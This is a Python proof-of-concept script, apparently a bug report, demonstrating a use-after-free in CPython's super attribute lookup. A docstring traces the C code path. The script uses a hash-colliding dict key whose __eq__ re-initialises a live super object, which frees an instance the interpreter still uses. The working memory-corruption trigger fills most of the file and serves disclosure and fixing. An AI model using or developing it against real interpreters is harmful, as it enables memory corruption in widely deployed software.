"""UAF: super_getattro passes three borrowed su-> fields into do_super_lookup,
which uses them after a call that runs arbitrary Python.

Objects/typeobject.c (3.16.0a0 @ 4f3be1b5777):

  12699  return do_super_lookup(su, su->type, su->obj, su->obj_type, name, NULL);
                                     ^^^^^^^^  ^^^^^^^  ^^^^^^^^^^^  all borrowed

  12647  res = _PySuper_LookupDescr(su_type, su_obj_type, name);
             -> 12622 PyDict_GetItemRef(dict, name, &res)
                      -> a non-string key in a class dict whose __hash__ collides
                         with `name` dispatches a user __eq__
                         -> super.__init__(s, ...) on the SAME live super object
                            -> 12950-12952 Py_XSETREF(su->type / su->obj /
                               su->obj_type)  drops the old references

  12656  res2 = f(res, su_obj, (PyObject *)su_obj_type);   <- use after free
             -> func_descr_get -> PyMethod_New -> Py_INCREF(su_obj)
                = a WRITE into the freed instance.

Hierarchy: C -> B -> A -> object.
  A holds the target attribute 'foo' (a plain function: non-data descriptor).
  B holds the evil non-string key (hash == hash('foo')), so the MRO walk hits
  the collision in B *before* finding 'foo' in A.
"""
import sys

box = {}
fired = []


def foo(self):
    return "foo"


class Evil:
    def __hash__(self):
        return hash('foo')

    def __eq__(self, other):
        s = box.get('s')
        if s is not None:
            box['s'] = None
            fired.append(1)
            # Re-initialise the LIVE super object in place.  This runs
            # Py_XSETREF(su->obj, ...), dropping the last reference to the
            # instance that do_super_lookup still holds as a borrowed local.
            super.__init__(s, D, D())
            print("  re-inited live super object", flush=True)
        return False


A = type('A', (object,), {'foo': foo})
B = type('B', (A,), {Evil(): 1})
C = type('C', (B,), {})
D = type('D', (B,), {})

inst = C()
s = super(C, inst)
box['s'] = s
del inst          # su->obj is now the sole owner of the C instance

print("refcount of su->obj before:", sys.getrefcount(s.__self__), flush=True)
print("looking up s.foo ...", flush=True)
r = s.foo
print("got:", r, "  evil __eq__ fired:", bool(fired), flush=True)
